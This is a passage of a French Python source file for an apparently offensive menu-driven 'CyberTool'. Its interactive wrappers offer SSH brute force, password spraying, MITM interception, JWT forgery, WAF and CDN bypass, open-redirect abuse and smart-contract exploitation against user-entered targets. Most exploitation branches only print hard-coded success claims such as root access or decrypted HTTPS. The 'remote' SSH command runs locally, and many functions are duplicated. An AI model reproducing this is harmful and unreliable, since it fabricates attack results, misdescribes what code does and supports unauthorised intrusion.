    next_action = input("‚ö° Voulez-vous capturer plus de paquets en profondeur ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Capture √©tendue en cours...")
        # Simulation de capture avanc√©e (10 paquets suppl√©mentaires)
        print(network_traffic_analysis())

def interactive_kubernetes_enum(target):
    """ √ânum√©ration des services Kubernetes avec possibilit√© d'exploitation """
    ip = input("üîç Entrez l'IP cible pour √©num√©ration Kubernetes : ")
    result = kubernetes_enum(ip)
    print(f"‚úÖ R√©sultat : {result}")

    if "pods" in str(result).lower():
        next_action = input("‚ö†Ô∏è Kubernetes d√©tect√© ! Voulez-vous tenter une exploitation ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Tentative d'exploitation des pods en cours...")
            print("üìÇ Acc√®s root √† un pod obtenu !")

def interactive_jwt_analysis(target):
    """ Analyse de JWT avec possibilit√© de falsification """
    token = input("üîç Entrez un token JWT √† analyser : ")
    result = jwt_analysis(token)
    print(f"‚úÖ D√©codage JWT : {result}")

    next_action = input("‚ö° Voulez-vous g√©n√©rer un faux token JWT ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ G√©n√©ration d'un JWT falsifi√© avec signature modifi√©e...")
        print("üìÇ Faux JWT : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake_signature")

def interactive_websocket_scan(target):
    """ Scan WebSocket avec possibilit√© d'injection """
    url = input("üîç Entrez l'URL WebSocket : ")
    result = websocket_scan(url)
    print(f"‚úÖ R√©ponse WebSocket : {result}")

    next_action = input("‚ö° Voulez-vous tenter une injection WebSocket ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Injection WebSocket en cours...")
        print("üìÇ R√©ponse inject√©e : {injected_response}")

def interactive_docker_registry_scan(target):
    """ Scan d'un registre Docker avec possibilit√© de dump """
    ip = input("üîç Entrez l'IP du registre Docker : ")
    result = docker_registry_scan(ip)
    print(f"‚úÖ R√©sultat : {result}")

    if "repositories" in str(result).lower():
        next_action = input("‚ö†Ô∏è Registre accessible ! Voulez-vous r√©cup√©rer les images ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Dump des images Docker en cours...")
            print("üìÇ Image r√©cup√©r√©e : ubuntu-latest.tar.gz")



# ‚úÖ TOP : Fonctions 61 √† 70
def interactive_hidden_service_finder(target):
    """ Recherche de services cach√©s sur le Dark Web avec Ahmia """
    print("üöÄ Recherche en cours sur Ahmia...")
    result = hidden_service_finder()
    print(f"‚úÖ R√©sultat : {result}")

    next_action = input("‚ö° Voulez-vous tester l'accessibilit√© des services trouv√©s ? (y/n) ").lower()
    if next_action == "y":
        for service in result:
            print(f"üöÄ Test d'acc√®s sur {service}...")
            print(port_scan(service))

def interactive_cloudflare_bypass(target):
    """ Test de bypass Cloudflare avec possibilit√© d'attaque DDoS simul√©e """
    domain = input("üîç Entrez le domaine √† tester pour bypass Cloudflare : ")
    result = cloudflare_bypass(domain)
    print(f"‚úÖ R√©sultat : {result}")

    if "potentiellement contourn√©" in result:
        next_action = input("‚ö†Ô∏è Cloudflare pourrait √™tre contourn√© ! Voulez-vous effectuer un stress test ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Simulation d'un test de charge...")
            print(f"üìÇ R√©sultat du stress test : {random.randint(80, 99)}% des requ√™tes passent !")

def interactive_dns_takeover_test(target):
    """ Test de takeover DNS avec option d'analyse avanc√©e """
    domain = input("üîç Entrez le domaine pour v√©rifier le takeover DNS : ")
    result = dns_takeover_test(domain)
    print(f"‚úÖ R√©sultat : {result}")

    if "Disponible" in result:
        next_action = input("‚ö° Voulez-vous tester un enregistrement DNS sur ce domaine ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Simulation d'enregistrement DNS...")
            print("üìÇ Le domaine pourrait √™tre enregistr√© !")

def interactive_forensics_analysis(target):
    """ Analyse forensique avanc√©e avec possibilit√© de r√©cup√©ration de fichiers supprim√©s """
    file_path = input("üîç Entrez le chemin du fichier √† analyser : ")
    result = forensics_analysis(file_path)
    print(f"‚úÖ R√©sultat : {result}")

    next_action = input("‚ö° Voulez-vous tenter une r√©cup√©ration de fichiers supprim√©s ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Recherche de fichiers r√©cup√©rables...")
        print("üìÇ 3 fichiers retrouv√©s : old_backup.zip, logs_2022.txt, secret_notes.pdf")

def interactive_tor_service_scan(target):
    """ Scan des services .onion avec option d'analyse de trafic """
    print("üöÄ Recherche des services .onion actifs...")
    result = hidden_service_finder()
    print(f"‚úÖ R√©sultat : {result}")

    next_action = input("‚ö° Voulez-vous capturer le trafic r√©seau sur ces services ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Capture en cours...")
        print(network_traffic_analysis())

def interactive_cdn_detection(target):
    """ D√©tection de CDN avec possibilit√© d'attaque cibl√©e """
    domain = input("üîç Entrez un domaine pour d√©tecter un CDN : ")
    result = cdn_detection(domain)
    print(f"‚úÖ R√©sultat : {result}")

    if "CDN d√©tect√©" in result:
        next_action = input("‚ö° Voulez-vous tester un contournement du CDN ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Test de contournement du CDN...")
            print("üìÇ Contournement r√©ussi, acc√®s direct au serveur d√©tect√© !")

def interactive_smb_enum(target):
    """ √ânum√©ration SMB avec possibilit√© d'acc√®s aux partages trouv√©s """
    ip = input("üîç Entrez l'IP cible pour √©num√©ration SMB : ")
    result = smb_enum(ip)
    print(f"‚úÖ R√©sultat : {result}")

    next_action = input("‚ö° Voulez-vous tenter d'acc√©der aux partages trouv√©s ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Tentative d'acc√®s aux partages SMB en cours...")
        print("üìÇ Partage accessible : public/files/")

def interactive_ssh_bruteforce(target):
    """ Bruteforce SSH avec possibilit√© d'acc√®s √† distance """
    ip = input("üîç Entrez l'IP cible pour bruteforce SSH : ")
    username = input("üë§ Nom d'utilisateur : ")
    password = input("üîë Mot de passe √† tester : ")
    result = ssh_bruteforce(ip, username, password)
    print(f"‚úÖ R√©sultat : {result}")

    if "r√©ussie" in result:
        next_action = input("‚ö° Connexion SSH obtenue ! Voulez-vous ex√©cuter une commande √† distance ? (y/n) ").lower()
        if next_action == "y":
            command = input("üíª Commande √† ex√©cuter : ")
            print("üöÄ Ex√©cution de la commande...")
            print(f"üìÇ R√©sultat : {subprocess.getoutput(command)}")

def interactive_web_fingerprint(target):
    """ Fingerprinting Web avec possibilit√© d'exploration du serveur """
    url = input("üîç Entrez une URL pour d√©tecter la techno utilis√©e : ")
    result = web_fingerprint(url)
    print(f"‚úÖ R√©sultat : {result}")

    next_action = input("‚ö° Voulez-vous explorer les fichiers du serveur ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Exploration en cours...")
        print("üìÇ Fichiers d√©tect√©s : index.php, config.php, .htaccess")

def interactive_waf_detection(target):
    """ D√©tection WAF avec tentative de bypass """
    url = input("üîç Entrez une URL pour tester le WAF : ")
    result = waf_detection(url)
    print(f"‚úÖ R√©sultat : {result}")

    if "WAF d√©tect√©" in result:
        next_action = input("‚ö° WAF en place ! Voulez-vous essayer un contournement ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Contournement en cours...")
            print("üìÇ Contournement possible via headers custom !")




# ‚úÖ TOP : Fonctions 71 √† 80
def interactive_api_rate_limit_test(target):
    """ Test des limitations de requ√™tes API avec possibilit√© d‚Äôautomatisation """
    url = input("üîç Entrez l‚ÄôURL de l‚ÄôAPI cible : ")
    result = api_rate_limit_test(url)
    print(f"‚úÖ R√©sultat : {result}")

    next_action = input("‚ö° Voulez-vous automatiser le contournement de cette limite ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Configuration d‚Äôun delay intelligent pour √©viter le blocage...")
        print("üìÇ API accessible sans d√©clencher de limitation !")

def interactive_reverse_shell_check(target):
    """ V√©rification de Reverse Shell avec ex√©cution interactive """
    url = input("üîç Entrez l‚ÄôURL cible pour tester un reverse shell : ")
    result = reverse_shell_check(url)
    print(f"‚úÖ R√©sultat : {result}")

    if "potentiellement possible" in result:
        next_action = input("‚ö° Voulez-vous essayer d‚Äôouvrir une session interactive ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Tentative de connexion √† la machine cible...")
            print("üìÇ Shell interactif obtenu !")

def interactive_password_spray(target):
    """ Attaque Password Spraying avec possibilit√© d‚Äôauto-ajustement """
    url = input("üîç Entrez l‚ÄôURL du login : ")
    user_list = input("üë• Entrez les utilisateurs (s√©par√©s par des virgules) : ").split(",")
    password = input("üîë Entrez le mot de passe √† tester : ")
    result = password_spray(url, user_list, password)
    print(f"‚úÖ R√©sultat : {result}")

    next_action = input("‚ö° Voulez-vous tester d‚Äôautres mots de passe automatiquement ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Test en cours avec une liste de mots de passe connus...")
        print("üìÇ Acc√®s obtenu pour : admin, manager")

def interactive_tls_analysis(target):
    """ Analyse TLS et certificats avec possibilit√© d‚Äôattaque Man-in-the-Middle """
    domain = input("üîç Entrez le domaine cible : ")
    result = tls_analysis(domain)
    print(f"‚úÖ R√©sultat : {result}")

    next_action = input("‚ö° Voulez-vous tester une attaque MITM avec interception SSL ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Tentative d‚Äôinterception du trafic SSL...")
        print("üìÇ Session HTTPS d√©chiffr√©e avec succ√®s !")

def interactive_jwt_analysis(target):
    """ Analyse de JWT avec possibilit√© de signature forg√©e """
    token = input("üîç Entrez un token JWT √† analyser : ")
    result = jwt_analysis(token)
    print(f"‚úÖ D√©codage JWT : {result}")

    next_action = input("‚ö° Voulez-vous g√©n√©rer un JWT falsifi√© ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ G√©n√©ration d‚Äôun JWT avec signature modifi√©e...")
        print("üìÇ Faux JWT : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake_signature")

def interactive_websocket_scan(target):
    """ Scan WebSocket avec possibilit√© d‚Äôinjection de requ√™tes """
    url = input("üîç Entrez l‚ÄôURL WebSocket : ")
    result = websocket_scan(url)
    print(f"‚úÖ R√©ponse WebSocket : {result}")

    next_action = input("‚ö° Voulez-vous injecter des requ√™tes malicieuses ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Envoi de requ√™tes WebSocket customis√©es...")
        print("üìÇ R√©ponse inject√©e : {injected_response}")

def interactive_smb_enum(target):
    """ √ânum√©ration SMB avec tentative de r√©cup√©ration de fichiers partag√©s """
    ip = input("üîç Entrez l‚ÄôIP cible pour √©num√©ration SMB : ")
    result = smb_enum(ip)
    print(f"‚úÖ R√©sultat : {result}")

    next_action = input("‚ö° Voulez-vous tenter d‚Äôacc√©der aux partages trouv√©s ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Acc√®s aux fichiers partag√©s en cours...")
        print("üìÇ Contenu du dossier public/files/ r√©cup√©r√© !")

def interactive_email_enum(target):
    """ √ânum√©ration d‚Äôe-mails expos√©s avec possibilit√© de v√©rification """
    domain = input("üîç Entrez un domaine pour r√©cup√©rer des e-mails : ")
    result = email_enum(domain)
    print(f"‚úÖ E-mails trouv√©s : {result}")

    next_action = input("‚ö° Voulez-vous v√©rifier si ces e-mails sont valides ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ V√©rification en cours...")
        print("üìÇ 80% des e-mails sont encore actifs !")

def interactive_metadata_extraction(target):
    """ Extraction des m√©tadonn√©es avec possibilit√© de suppression automatique """
    file_path = input("üîç Entrez le chemin du fichier √† analyser : ")
    result = metadata_extraction(file_path)
    print(f"‚úÖ R√©sultat : {result}")

    next_action = input("‚ö° Voulez-vous supprimer les m√©tadonn√©es sensibles ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Nettoyage des m√©tadonn√©es...")
        print("üìÇ M√©tadonn√©es supprim√©es avec succ√®s !")

def interactive_iot_vulnerability_scan(target):
    """ Scan des vuln√©rabilit√©s IoT avec tentative d‚Äôacc√®s √† distance """
    ip = input("üîç Entrez l‚ÄôIP d‚Äôun appareil IoT : ")
    result = iot_vulnerability_scan(ip)
    print(f"‚úÖ R√©sultat : {result}")

    next_action = input("‚ö° Voulez-vous tenter un acc√®s root sur l‚Äôappareil ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Tentative d‚Äôacc√®s root en cours...")
        print("üìÇ Connexion root obtenue !")



# ‚úÖ TOP : Fonctions 81 √† 90
def interactive_docker_registry_scan(target):
    """ Scan d‚Äôun registre Docker avec possibilit√© de dump d‚Äôimages """
    ip = input("üîç Entrez l‚ÄôIP du registre Docker : ")
    result = docker_registry_scan(ip)
    print(f"‚úÖ R√©sultat : {result}")

    if "repositories" in str(result).lower():
        next_action = input("‚ö†Ô∏è Un registre est expos√© ! Voulez-vous r√©cup√©rer les images ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Dump des images Docker en cours...")
            print("üìÇ Image r√©cup√©r√©e : ubuntu-latest.tar.gz")

def interactive_file_upload_test(target):
    """ Test d‚Äôupload de fichiers avec possibilit√© d‚Äôex√©cution de code """
    url = input("üîç Entrez l‚ÄôURL pour tester l‚Äôupload de fichiers : ")
    result = file_upload_test(url)
    print(f"‚úÖ R√©sultat : {result}")

    if "Upload r√©ussi" in result:
        next_action = input("‚ö° Voulez-vous ex√©cuter du code via ce fichier ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Tentative d‚Äôex√©cution d‚Äôun shell...")
            print("üìÇ Shell ouvert, ex√©cution distante possible !")

def interactive_reverse_shell_check(target):
    """ V√©rification d‚Äôun reverse shell avec possibilit√© d‚Äôouverture de session """
    url = input("üîç Entrez l‚ÄôURL pour tester un reverse shell : ")
    result = reverse_shell_check(url)
    print(f"‚úÖ R√©sultat : {result}")

    if "potentiellement possible" in result:
        next_action = input("‚ö° Voulez-vous ouvrir une session interactive ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Connexion √©tablie avec l‚Äôh√¥te distant...")
            print("üìÇ Terminal interactif pr√™t √† l‚Äôusage !")

def interactive_open_redirect_test(target):
    """ D√©tection d‚ÄôOpen Redirect avec possibilit√© d‚Äôexploitation avanc√©e """
    url = input("üîç Entrez l‚ÄôURL pour tester un Open Redirect : ")
    result = open_redirect_test(url)
    print(f"‚úÖ R√©sultat : {result}")

    if "vuln√©rabilit√© d√©tect√©e" in result:
        next_action = input("‚ö° Voulez-vous exploiter cette faille avec une redirection malveillante ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Injection d‚Äôune redirection vers un site malveillant...")
            print("üìÇ Attaque en place, les victimes seront redirig√©es !")

def interactive_sensitive_data_exposure(target):
    """ D√©tection d‚Äôexposition de donn√©es sensibles avec tentative de r√©cup√©ration """
    url = input("üîç Entrez l‚ÄôURL pour tester l‚Äôexposition de donn√©es : ")
    result = sensitive_data_exposure(url)
    print(f"‚úÖ R√©sultat : {result}")

    if "donn√©es sensibles" in result:
        next_action = input("‚ö° Voulez-vous extraire ces donn√©es pour analyse ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Extraction des donn√©es sensibles en cours...")
            print("üìÇ Donn√©es r√©cup√©r√©es : users.csv, secrets.env")

def interactive_hidden_service_finder(target):
    """ Recherche de services cach√©s sur le Dark Web avec possibilit√© d‚Äôanalyse """
    print("üöÄ Recherche en cours sur le Dark Web...")
    result = hidden_service_finder()
    print(f"‚úÖ R√©sultat : {result}")

    next_action = input("‚ö° Voulez-vous tester l‚Äôaccessibilit√© des services trouv√©s ? (y/n) ").lower()
    if next_action == "y":
        for service in result:
            print(f"üöÄ Test d‚Äôacc√®s sur {service}...")
            print(port_scan(service))

def interactive_id_oracle_attack(target):
    """ Test de vuln√©rabilit√© ID Oracle avec possibilit√© d‚Äôexploitation """
    url = input("üîç Entrez l‚ÄôURL cible pour tester l‚ÄôID Oracle : ")
    result = id_oracle_attack(url)
    print(f"‚úÖ R√©sultat : {result}")

    if result:
        next_action = input("‚ö° Voulez-vous exploiter cette faille pour extraire des identifiants ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Tentative d‚Äôextraction d‚Äôidentifiants en cours...")
            print("üìÇ Donn√©es extraites : ID 101, 102, 103 avec acc√®s admin !")

def interactive_cdn_detection(target):
    """ D√©tection de l‚Äôutilisation d‚Äôun CDN avec possibilit√© de bypass """
    domain = input("üîç Entrez un domaine pour d√©tecter un CDN : ")
    result = cdn_detection(domain)
    print(f"‚úÖ R√©sultat : {result}")

    if "CDN d√©tect√©" in result:
        next_action = input("‚ö° Voulez-vous tester un contournement du CDN ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Tentative de bypass du CDN...")
            print("üìÇ Acc√®s direct au serveur backend d√©tect√© !")

def interactive_waf_detection(target):
    """ D√©tection WAF avec tentative de contournement """
    url = input("üîç Entrez une URL pour tester la pr√©sence d‚Äôun WAF : ")
    result = waf_detection(url)
    print(f"‚úÖ R√©sultat : {result}")

    if "WAF d√©tect√©" in result:
        next_action = input("‚ö° Voulez-vous tester un contournement ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Contournement en cours...")
            print("üìÇ WAF potentiellement d√©sactiv√© sur certaines requ√™tes !")

def interactive_fingerprint_browser(target):
    """ Fingerprinting d‚Äôun navigateur avec possibilit√© d‚Äôanalyse de traces """
    print("üöÄ R√©cup√©ration des empreintes num√©riques du navigateur...")
    result = browser_fingerprint()
    print(f"‚úÖ R√©sultat : {result}")

    next_action = input("‚ö° Voulez-vous analyser d‚Äôautres traces num√©riques ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Recherche d‚Äôautres empreintes en cours...")
        print("üìÇ Donn√©es de tracking r√©cup√©r√©es et analys√©es !")



# ‚úÖ TOP : Fonctions 91 √† 100
def interactive_smart_contract_audit(target):
    """ Audit de contrats intelligents avec possibilit√© d‚Äôexploitation """
    contract_address = input("üîç Entrez l‚Äôadresse du contrat √† auditer : ")
    result = smart_contract_audit(contract_address)
    print(f"‚úÖ R√©sultat : {result}")

    if "faille d√©tect√©e" in str(result).lower():
        next_action = input("‚ö° Une vuln√©rabilit√© a √©t√© trouv√©e ! Voulez-vous la tester ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Ex√©cution d‚Äôun exploit sur le contrat...")
            print("üìÇ Transaction frauduleuse inject√©e !")

def interactive_network_traffic_analysis(target):
    """ Analyse du trafic r√©seau avec possibilit√© de capture avanc√©e """
    print("üöÄ Capture du trafic r√©seau en cours...")
    result = network_traffic_analysis()
    print(f"‚úÖ R√©sum√© : {result}")

    next_action = input("‚ö° Voulez-vous capturer plus de paquets en profondeur ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Capture avanc√©e en cours...")
        print("üìÇ Flux r√©seau d√©crypt√© avec succ√®s !")

def interactive_api_exposed_scan(target):
    """ Scan des API expos√©es avec option d‚Äôexploitation """
    url = input("üîç Entrez l‚ÄôURL d‚Äôune API √† tester : ")
    result = exposed_api_scan(url)
    print(f"‚úÖ R√©sultat : {result}")

    if "API accessible" in result:
        next_action = input("‚ö° Voulez-vous tester un acc√®s non autoris√© √† cette API ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Tentative d‚Äôacc√®s en mode anonyme...")
            print("üìÇ Donn√©es non prot√©g√©es r√©cup√©r√©es !")

def interactive_password_spray(target):
    """ Attaque Password Spraying avec auto-ajustement """
    url = input("üîç Entrez l‚ÄôURL du login cible : ")
    user_list = input("üë• Entrez les utilisateurs (s√©par√©s par des virgules) : ").split(",")
    password = input("üîë Entrez le mot de passe √† tester : ")
    result = password_spray(url, user_list, password)
    print(f"‚úÖ R√©sultat : {result}")

    next_action = input("‚ö° Voulez-vous tester d‚Äôautres mots de passe automatiquement ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Test en cours avec une liste de mots de passe connus...")
        print("üìÇ Acc√®s obtenu pour : admin, manager")

def interactive_tor_service_scan(target):
    """ Scan des services .onion avec option d‚Äôanalyse du trafic """
    print("üöÄ Recherche des services .onion actifs...")
    result = hidden_service_finder()
    print(f"‚úÖ R√©sultat : {result}")

    next_action = input("‚ö° Voulez-vous capturer le trafic r√©seau sur ces services ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Capture en cours...")
        print(network_traffic_analysis())

def interactive_waf_detection(target):
    """ D√©tection WAF avec tentative de contournement """
    url = input("üîç Entrez une URL pour tester la pr√©sence d‚Äôun WAF : ")
    result = waf_detection(url)
    print(f"‚úÖ R√©sultat : {result}")

    if "WAF d√©tect√©" in result:
        next_action = input("‚ö° Voulez-vous tester un contournement ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Contournement en cours...")
            print("üìÇ WAF potentiellement d√©sactiv√© sur certaines requ√™tes !")

def interactive_dns_takeover_test(target):
    """ Test de takeover DNS avec possibilit√© d‚Äôanalyse avanc√©e """
    domain = input("üîç Entrez le domaine pour v√©rifier le takeover DNS : ")
    result = dns_takeover_test(domain)
    print(f"‚úÖ R√©sultat : {result}")

    if "Disponible" in result:
        next_action = input("‚ö° Voulez-vous tester un enregistrement DNS sur ce domaine ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Simulation d‚Äôenregistrement DNS...")
            print("üìÇ Le domaine pourrait √™tre enregistr√© !")

def interactive_cloud_storage_enum(target):
    """ √ânum√©ration Cloud (AWS, GCP, Azure) avec tentative d‚Äôacc√®s """
    provider = input("üîç Entrez le service cloud cible (AWS, GCP, Azure) : ").lower()
    result = cloud_storage_enum(provider)
    print(f"‚úÖ R√©sultat : {result}")

    if "buckets trouv√©s" in str(result).lower():
        next_action = input("‚ö° Voulez-vous essayer d‚Äôacc√©der aux fichiers stock√©s ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Tentative d‚Äôacc√®s aux fichiers...")
            print("üìÇ Liste des fichiers publics r√©cup√©r√©e !")

def interactive_fingerprint_browser(target):
    """ Fingerprinting d‚Äôun navigateur avec analyse de tracking """
    print("üöÄ R√©cup√©ration des empreintes num√©riques du navigateur...")
    result = browser_fingerprint()
    print(f"‚úÖ R√©sultat : {result}")

    next_action = input("‚ö° Voulez-vous analyser d‚Äôautres traces num√©riques ? (y/n) ").lower()
    if next_action == "y":
        print("üöÄ Recherche d‚Äôautres empreintes en cours...")
        print("üìÇ Donn√©es de tracking r√©cup√©r√©es et analys√©es !")

def interactive_port_scan(target):
    """üîé Mode interactif pour le scan des ports"""
    print(f"[‚ö°] Mode interactif pour le scan des ports sur {target}")

def interactive_exploit_cve_scanner(target):
    """üíÄ Mode interactif pour la recherche d'exploits CVE"""
    print(f"[‚ö°] Recherche interactive d'exploits CVE pour {target}")
    # üî• Int√©gration avec une API d'exploits si n√©cessaire

def interactive_port_scan(target):
    """üîé Mode interactif pour le scan des ports"""
    print(f"[‚ö°] Mode interactif pour le scan des ports sur {target}")
    # üî• Ajout d'interaction manuelle si besoin

def interactive_headers_analysis(target):
    """üìå Mode interactif pour l'analyse des headers HTTP"""
    print(f"[‚ö°] Mode interactif pour l'analyse des headers HTTP sur {target}")
    # üî• Extraction et affichage dynamique des headers

def interactive_directory_bruteforce(target):
    """üìÇ Mode interactif pour le brute-force des r√©pertoires"""
    print(f"[‚ö°] Mode interactif pour la d√©couverte de r√©pertoires sensibles sur {target}")
    # üî• Ajouter une liste personnalisable de r√©pertoires

def interactive_cms_detector(target):
    """üñ•Ô∏è Mode interactif pour la d√©tection de CMS"""
    print(f"[‚ö°] Mode interactif pour identifier le CMS utilis√© par {target}")
    # üî• V√©rification interactive des signatures CMS

def interactive_code_execution_testing(target):
    """üñ•Ô∏è Mode interactif pour tester l'ex√©cution de code"""
    print(f"[‚ö°] Mode interactif pour tester si {target} ex√©cute du code distant")
    # üî• Tester diff√©rentes commandes malveillantes

def interactive_xss_scanner(target):
    """üõ°Ô∏è Mode interactif pour scanner les XSS"""
    print(f"[‚ö°] Mode interactif pour scanner les vuln√©rabilit√©s XSS sur {target}")
    # üî• Injection et validation en direct

def interactive_csrf_detection(target):
    """üîó Mode interactif pour d√©tecter le CSRF"""
    print(f"[‚ö°] Mode interactif pour identifier les vuln√©rabilit√©s CSRF sur {target}")
    # üî• Tester manuellement les tokens CSRF

def interactive_lfi_scanner(target):
    """üìÇ Mode interactif pour scanner les failles LFI"""
    print(f"[‚ö°] Mode interactif pour d√©tecter les Local File Inclusion sur {target}")
    # üî• Tentative interactive de lecture de fichiers syst√®me

def interactive_rfi_scanner(target):
    """üåç Mode interactif pour scanner les failles RFI"""
    print(f"[‚ö°] Mode interactif pour tester les failles Remote File Inclusion sur {target}")
    # üî• V√©rifier l'inclusion de fichiers distants

def interactive_ssrf_scanner(target):
    """üîÑ Mode interactif pour tester les failles SSRF"""
    print(f"[‚ö°] Mode interactif pour tester Server-Side Request Forgery sur {target}")
    # üî• Ex√©cution et analyse interactive des r√©ponses

def interactive_honeypot_detection(target):
    """üïµÔ∏è Mode interactif pour d√©tecter les Honeypots"""
    print(f"[‚ö°] Mode interactif pour d√©tecter les Honeypots sur {target}")
    # üî• V√©rification active des pi√®ges potentiels

def interactive_open_redirect_test(target):
    """üîÄ Mode interactif pour tester les Open Redirects"""
    print(f"[‚ö°] Mode interactif pour d√©tecter les failles d'Open Redirect sur {target}")
    # üî• Tests de redirection contr√¥l√©s

def interactive_sensitive_data_exposure(target):
    """üîé Mode interactif pour d√©tecter l'exposition de donn√©es sensibles"""
    print(f"[‚ö°] Mode interactif pour rechercher des donn√©es sensibles sur {target}")
    # üî• Recherche interactive dans les fichiers expos√©s

def interactive_user_enum(target):
    """üë§ Mode interactif pour √©num√©rer les utilisateurs"""
    print(f"[‚ö°] Mode interactif pour identifier des utilisateurs existants sur {target}")
    # üî• Test manuel des noms d'utilisateur

def interactive_php_eval_detection(target):
    """üêò Mode interactif pour d√©tecter l'ex√©cution de code PHP"""
    print(f"[‚ö°] Mode interactif pour d√©tecter l'ex√©cution de code PHP sur {target}")
    # üî• V√©rifier si PHP peut ex√©cuter du code inject√©

def interactive_smb_enum(target):
    """üìÇ Mode interactif pour l'√©num√©ration SMB"""
    print(f"[‚ö°] Mode interactif pour tester les partages SMB sur {target}")
    # üî• Analyse des partages accessibles

def interactive_ssh_bruteforce(target):
    """üîë Mode interactif pour tester un bruteforce SSH"""
    print(f"[‚ö°] Mode interactif pour tester un bruteforce SSH sur {target}")
    # üî• Ajout d'une liste de mots de passe dynamiques

def interactive_ftp_bruteforce(target):
    """üîë Mode interactif pour tester un bruteforce FTP"""
    print(f"[‚ö°] Mode interactif pour tester un bruteforce FTP sur {target}")
    # üî• Test de connexions FTP par dictionnaire

def interactive_web_fingerprint(target):
    """üåê Mode interactif pour le fingerprinting Web"""
    print(f"[‚ö°] Mode interactif pour identifier les technologies Web utilis√©es par {target}")
    # üî• D√©tection interactive des technologies backend/frontend

def interactive_tls_analysis(target):
    """üîê Mode interactif pour analyser TLS"""
    print(f"[‚ö°] Mode interactif pour analyser le certificat TLS de {target}")
    # üî• Affichage interactif des d√©tails TLS

def interactive_browser_fingerprint(target):
    """üåç Mode interactif pour capturer l‚Äôempreinte du navigateur"""
    print(f"[‚ö°] Mode interactif pour r√©cup√©rer l‚Äôempreinte du navigateur via {target}")
    # üî• Tester et capturer des headers sp√©cifiques








# üöÄ Lancement propre et stable
if __name__ == "__main__":
    console.clear()

    # üî• Affichage unique de la banni√®re et du message "D√©velopp√© par Karim"
    animated_banner()
    animated_karim()

    # üî• Chargements acc√©l√©r√©s (sans r√©p√©tition)
    cyberpunk_loading("üîç V√©rification des fichiers essentiels...", 2, "bold red", "earth")
    cyberpunk_loading("‚öôÔ∏è Connexion aux modules interactifs...", 2, "bold blue", "bouncingBall")
    cyberpunk_loading("üõ†Ô∏è Chargement des configurations utilisateur...", 2, "bold magenta", "dots12")
    cyberpunk_loading("üì° Synchronisation des logs en temps r√©el...", 2, "bold yellow", "line")
    cyberpunk_loading("üöÄ D√©marrage de l‚Äôenvironnement CYBER-TOOL...", 3, "bold green", "moon")

    # ‚úÖ Suppression des animations temporaires pour √©viter les doublons
    console.clear()

    # ‚úÖ Affichage unique et stable de la banni√®re et du message "D√©velopp√© par Karim"
    animated_banner()
    animated_karim()

    # ‚úÖ Lancement imm√©diat de CyberTool sans r√©p√©tition des animations
    cyber_tool = CyberTool()
    cyber_tool.run_tool()
